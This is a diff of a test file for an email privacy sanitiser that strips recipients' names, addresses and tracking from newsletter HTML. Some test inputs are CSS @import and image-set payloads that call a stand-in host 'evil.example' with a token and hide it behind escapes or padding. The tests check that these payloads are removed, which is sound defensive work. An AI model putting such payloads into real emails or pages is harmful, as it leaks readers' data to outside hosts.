@@ -3,7 +3,6 @@ import { describe, expect, it, vi } from 'vitest'
 
 vi.mock('server-only', () => ({}))
 import { inboxConfig } from './config'
-import { parseLimits } from './parse-guard'
 import {
   cleanEmail,
   cleanEmailHtml,
@@ -11,7 +10,6 @@ import {
   cleanEmailSubject,
   cleanEmailText,
   inboxIdentity,
-  privacyLimits,
   settle,
   type InboxIdentity
 } from './privacy'
@@ -28,22 +26,6 @@ const leaks =
 /** The words of the body only. */
 const body = (html: string | null) =>
   html?.replace(/^.*<body>|<\/body>.*$/gs, '') ?? null
-
-/** Lowers one limit for a test, to prove that the guard holds. */
-function withLimit<L extends Record<string, number>>(
-  limits: L,
-  key: keyof L,
-  value: number,
-  run: () => void
-) {
-  const was = limits[key]
-  limits[key] = value as L[keyof L]
-  try {
-    run()
-  } finally {
-    limits[key] = was
-  }
-}
 
 /** A Klaviyo-style newsletter, with everything a subscriber's copy has. */
 const klaviyo = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -287,14 +269,40 @@ Northwind Outdoor, 1 Sample Street`)
     const text = cleanEmailText(`${'linen '.repeat(20_000)}end`, me)
     expect(text.length).toBeLessThanOrEqual(10_000)
     expect(text.endsWith('linen')).toBe(true)
-    withLimit(privacyLimits, 'readFactor', 0.5, () =>
-      expect(cleanEmailText('linen '.repeat(2_000), me).length).toBeLessThan(
-        5_001
-      )
-    )
+    const half = { limits: { readFactor: 0.5 } }
+    expect(
+      cleanEmailText('linen '.repeat(2_000), me, half).length
+    ).toBeLessThan(5_001)
     const subject = cleanEmailSubject('Hi Sam, '.repeat(40), me)
     expect(subject.length).toBeLessThanOrEqual(200)
     expect(subject.endsWith('Hi there,')).toBe(true)
+    // Never half a character, and one line.
+    const emoji = cleanEmailSubject(`${'a'.repeat(199)}\u{1f600}b`, me)
+    expect([emoji.length, emoji.isWellFormed()]).toEqual([199, true])
+    expect(cleanEmailSubject('Spring\n\n  sale', me)).toBe('Spring sale')
+    expect(cleanEmailPreview('Spring\n\n  sale', me)).toBe('Spring sale')
+  })
+
+  it('removes names written in Cyrillic or Greek, in any case', () => {
+    for (const name of ['Анна', 'Дмитрий', 'Μαρία', 'Ζήνων', 'Λήδα', 'Юлия']) {
+      const them = { addresses: [], names: [name] }
+      expect(cleanEmailText(`Hi ${name}, thanks ${name}!`, them), name).toBe(
+        'Hi there, thanks!'
+      )
+      expect(cleanEmailSubject(`${name}, 20% off`, them), name).toBe('20% off')
+      expect(cleanEmailText(`Hi ${name.toUpperCase()},`, them), name).toBe(
+        'Hi there,'
+      )
+    }
+  })
+
+  it('reads full-width letters and at signs as plain ones', () => {
+    expect(cleanEmailText('Thanks, \u{ff33}\u{ff41}\u{ff4d}!', me)).toBe(
+      'Thanks!'
+    )
+    expect(
+      cleanEmailText('Write to help\u{fe6b}northwind.example today', me)
+    ).toBe('Write to today')
   })
 })
 
@@ -406,6 +414,34 @@ describe('cleanEmailHtml', () => {
     )
   })
 
+  it('writes only plain tag and attribute names, and href only on links', () => {
+    for (const [html, out] of [
+      ['<p>Hi <abc!def>Linen</abc!def></p>', '<p>Hi Linen</p>'],
+      ['<p><sampleinbox>Linen</sampleinbox></p>', '<p>Linen</p>'],
+      ['<p a!b="1" class="x">Linen</p>', '<p class="x">Linen</p>'],
+      ['<div href="https://x.example/?t=1">Linen</div>', '<div>Linen</div>'],
+      [
+        `<p title='say "hi"'>Linen</p>`,
+        '<p title="say &quot;hi&quot;">Linen</p>'
+      ]
+    ])
+      expect(body(cleanEmailHtml(html!, me)), html).toBe(out)
+  })
+
+  it('reads <br> as a line break between the pieces of a block', () => {
+    for (const [html, out] of [
+      // Separate lines are not one word, and no greeting crosses them.
+      ['<p>Sa<br>m</p>', '<p>Sa<br>m</p>'],
+      ['<p>Hello<br>Sam,</p>', '<p>Hello<br>,</p>'],
+      // An address cut by a tag goes with the whole word around it.
+      [
+        '<p>Write to:sample#in<b>box@gmail.com</b> today</p>',
+        '<p>Write <b></b> today</p>'
+      ]
+    ])
+      expect(body(cleanEmailHtml(html!, me)), html).toBe(out)
+  })
+
   it('accepts a result only once cleaning it again changes nothing', () => {
     expect(settle('a', (s) => s)).toBe('a')
     expect(settle('a', () => 'b')).toBe('b')
@@ -465,10 +501,10 @@ describe('cleanEmail', () => {
       ).not.toBeNull()
       expect(cleanEmailHtml(`<style>${text}</style>`, me)).not.toBeNull()
     }
-    // Huge: half a megabyte of newsletters, and 2 MB of words followed by
+    // Huge: half a megabyte of newsletters, and 800 KB of words followed by
     // thousands of small texts (each once read the words before it).
     expect(cleanEmailHtml(klaviyo.repeat(250), me)).not.toMatch(person)
-    const crowd = `<p>${'x '.repeat(825_000)}${'<b>a@b.cd</b> <b>Sam</b> '.repeat(12_250)}</p>`
+    const crowd = `<p>${'x '.repeat(400_000)}${'<b>a@b.cd</b> <b>Sam</b> '.repeat(6_000)}</p>`
     const crowded = cleanEmailHtml(crowd, me)
     expect(crowded).not.toBeNull()
     expect(crowded).not.toMatch(/a@b|b\.cd|Sam/)
@@ -490,16 +526,213 @@ describe('cleanEmail', () => {
 
   it('refuses HTML over each limit', () => {
     expect(cleanEmailHtml(klaviyo, me)).not.toBeNull()
-    for (const [key, value] of [
-      ['ms', -1],
-      ['tags', 5],
-      ['html', 100],
-      ['attributeWork', 3],
-      ['depth', 3]
-    ] as const)
-      withLimit(parseLimits, key, value, () =>
-        expect(cleanEmailHtml(klaviyo, me), key).toBeNull()
+    for (const limits of [
+      { ms: -1 },
+      { tags: 5 },
+      { html: 100 },
+      { attributeWork: 3 },
+      { depth: 3 }
+    ])
+      expect(
+        cleanEmailHtml(klaviyo, me, { limits }),
+        Object.keys(limits)[0]
+      ).toBeNull()
+    // 1 MB: far above any newsletter (Gmail clips at 102 KB).
+    expect(cleanEmailHtml(klaviyo.repeat(700), me)).toBeNull()
+    // Comments split the words too, so they count as tags.
+    const started = Date.now()
+    expect(cleanEmailHtml(`<p>${'S<!---->'.repeat(60_000)}</p>`, me)).toBeNull()
+    expect(Date.now() - started).toBeLessThan(1_500)
+    // Escaping may grow the cleaned HTML past 1 MB: it is still read back.
+    expect(cleanEmailHtml(`<p>${'&'.repeat(900_000)}</p>`, me)).not.toBeNull()
+  })
+
+  it('checks its one deadline at every step of every round', () => {
+    // A clock that has run out at one kind of check only: each check
+    // alone stops the cleaning.
+    for (const check of ['scan', 'element', 'walk', 'block', 'writer']) {
+      const clock = (at: string) => (at === check ? Infinity : 0)
+      expect(cleanEmailHtml(klaviyo, me, { clock }), check).toBeNull()
+    }
+    // Time passes at each check; the first round alone fits in the time,
+    // both rounds do not: the deadline is shared.
+    let ticks = 0
+    const clock = () => ticks++
+    expect(cleanEmailHtml(klaviyo, me, { clock })).not.toBeNull()
+    const both = ticks
+    ticks = 0
+    expect(
+      cleanEmailHtml(klaviyo, me, {
+        clock,
+        limits: { ms: Math.round(both * 0.75) }
+      })
+    ).toBeNull()
+  })
+})
+
+describe('what the third review found', () => {
+  const sample = {
+    addresses: ['capture@inbox.example', 'samriv@gmail.com'],
+    names: []
+  }
+
+  it('removes every address shape, hidden or not', () => {
+    for (const text of [
+      'sampleinbox%25252540gmail.com',
+      'john.doe@[10.0.0.1]',
+      '"john doe"@example.com',
+      'john!doe@example.com',
+      'help [@] northwind.example',
+      'john\u{34f}@doe.example',
+      'sampleinbox+north.wind',
+      'sampleinbox.Thanks',
+      'sampleinbox_shop'
+    ])
+      expect(cleanEmailText(`Write to ${text} today`, me), text).not.toMatch(
+        /sampleinbox|john|doe|help|%/
       )
+    // A short local part goes next to its own domain, however spaced.
+    for (const text of [
+      'capture at inbox.example',
+      'capture [@] inbox.example',
+      'capture @ inbox . example',
+      'capture &#64; inbox.example',
+      'samriv at gmail',
+      'samriv [at] gmail',
+      'samriv   @   gmail.com',
+      'samriv&#64;gmail.com'
+    ])
+      expect(cleanEmailText(`Write to ${text} today`, sample), text).toBe(
+        'Write to today'
+      )
+  })
+
+  it('removes a name hidden by invisible or styled characters', () => {
+    for (const text of [
+      'Thanks, Sa\u{34f}m!',
+      'Thanks, Sa\u{fe0f}m!',
+      'Thanks, Sa\u{e0020}m!',
+      'Thanks, Sa\u{1d173}m!',
+      'Thanks, \u{1d412}\u{1d41a}\u{1d426}!'
+    ])
+      expect(cleanEmailText(text, me), text).toBe('Thanks!')
+    expect(cleanEmailText('Hi \u{1d412}\u{1d41a}\u{1d426},', me)).toBe(
+      'Hi there,'
+    )
+    const irish = { addresses: [], names: ["O'Brien"] }
+    expect(cleanEmailText('Thanks, O\u{2019}Brien!', irish)).toBe('Thanks!')
+  })
+
+  it('removes names in scripts written without spaces', () => {
+    expect(
+      cleanEmailText(
+        '\u{5c71}\u{7530}\u{592a}\u{90ce}\u{69d8}\u{3001}\u{3053}\u{3093}\u{306b}\u{3061}\u{306f}',
+        {
+          addresses: [],
+          names: ['\u{5c71}\u{7530}\u{592a}\u{90ce}']
+        }
+      )
+    ).toBe('\u{69d8}\u{3001}\u{3053}\u{3093}\u{306b}\u{3061}\u{306f}')
+    expect(
+      cleanEmailText(
+        '\u{ae40}\u{bbfc}\u{c218}\u{b2d8}, \u{c548}\u{b155}\u{d558}\u{c138}\u{c694}',
+        {
+          addresses: [],
+          names: ['\u{ae40}\u{bbfc}\u{c218}']
+        }
+      )
+    ).toBe('\u{b2d8}, \u{c548}\u{b155}\u{d558}\u{c138}\u{c694}')
+  })
+
+  it('keeps delivery promises that only say "you"', () => {
+    for (const text of [
+      'Delivered to you in two days.',
+      'Delivered to you in 2\u{2013}3 working days.',
+      'Sent to you the next morning.',
+      'Delivered to you every Friday'
+    ])
+      expect(cleanEmailText(text, me)).toBe(text)
+  })
+
+  it('refuses text that does not settle', () => {
+    expect(
+      cleanEmailText('Write sa(sa(sa(sa(sam)m)m)m)mpleinbox now', me)
+    ).toBe('')
+  })
+
+  it('shows only real raster data images and plain srcset sizes', () => {
+    expect(
+      body(
+        cleanEmailHtml(
+          '<img src="data:image/png,hello sampleinbox@gmail.com Sam Rivera"><img src="data:image/png;name=sampleinbox@gmail.com;base64,AAAA"><video poster="data:image/gif,Sam Rivera"></video><img srcset="data:image/png;base64,AAAA 1x sampleinbox@gmail.com"><img srcset="img/aa.png 1x Sam Rivera, img/aa.png 2x">',
+          me,
+          { images }
+        )
+      )
+    ).toBe(
+      '<img src=""><img src=""><video poster=""></video><img srcset=""><img srcset="img/aa.png 2x">'
+    )
+  })
+
+  it('never shows a personalised picture, not even its stored copy', () => {
+    const nifty =
+      'https://img.nifty.example/hello.png?name=Sam&email=sampleinbox%40gmail.com'
+    expect(
+      body(
+        cleanEmailHtml(`<img src="${nifty.replace('&', '&amp;')}">`, me, {
+          images: [{ ref: nifty, path: 'img/cc.png' }]
+        })
+      )
+    ).toBe('<img src="">')
+    // Escapes are read, also twice applied, for a short local part too.
+    const twice = 'https://x.example/a.png?e=capture%2540inbox.example'
+    expect(
+      body(
+        cleanEmailHtml(`<img src="${twice}">`, sample, {
+          images: [{ ref: twice, path: 'img/dd.png' }]
+        })
+      )
+    ).toBe('<img src="">')
+  })
+
+  it('lets no CSS load a file, whatever it hides behind', () => {
+    for (const css of [
+      '<style>@import "https://evil.example/x.css?k=TOKEN\\\n";</style>',
+      '<style>@import "\\\nhttps://evil.example/x.css";</style>',
+      `<div style="background:image-set('https://evil.example/a.png?k=TOKEN\\\n' 1x)">x</div>`,
+      '<div style="background:image-set(&quot;https://evil.example/a.png?k=TOKEN\\&#10;&quot; 1x)">x</div>',
+      `<style>@import "${'x'.repeat(2_100)}https://evil.example/?k=TOKEN";</style>`,
+      '<style>@import url(https://evil.example/x.css);</style>',
+      '<style>@import "https://evil.example/x.css"</style>'
+    ])
+      expect(cleanEmailHtml(css, me), css.slice(0, 60)).not.toMatch(
+        /evil|TOKEN/
+      )
+    // Ordinary CSS stays as written.
+    const plain =
+      '<style>@media (width < 600px){.sm\\:hidden{display:none}}a{content:"\\\\\\\\"}</style>'
+    expect(cleanEmailHtml(plain, me)).toContain(plain)
+  })
+
+  it('never takes a name out of CSS words or HTML tag names', () => {
+    const persona = {
+      addresses: [],
+      names: ['Max Georgia', 'Li', 'Em', 'Mark', 'Line', 'Min']
+    }
+    const html =
+      '<p style="max-width:600px;line-height:1.5;min-height:1px;font-family:Georgia,serif"><em>Linen</em></p><ul><li>One</li></ul><mark>New</mark>'
+    expect(body(cleanEmailHtml(html, persona))).toBe(html)
+  })
+
+  it('joins the words of boxes set to display inline', () => {
+    expect(
+      body(
+        cleanEmailHtml(
+          '<p style="display:inline">Sa</p><p style="display:inline">m</p>',
+          me
+        )
+      )
+    ).toBe('<p style="display:inline"></p><p style="display:inline"></p>')
   })
 })
 
